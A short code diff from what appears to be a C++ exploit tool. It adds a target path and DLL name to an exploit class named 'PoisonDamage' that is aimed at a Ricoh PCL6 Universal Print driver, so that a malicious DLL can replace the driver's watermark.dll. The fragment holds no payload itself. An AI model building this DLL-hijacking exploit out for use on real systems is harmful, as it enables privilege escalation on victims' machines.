@@ -158,6 +158,8 @@ namespace
 
 PoisonDamage::PoisonDamage() :
     Exploit("PCL6 Driver for Universal Print"),
+    m_target_directory("C:\\ProgramData\\RICOH_DRV\\PCL6 Driver for Universal Print\\_common\\dlz\\watermark.dll"),
+    m_target_dll("watermark.dll"),
     m_malicious_dll("Dll.dll")
 {
 }
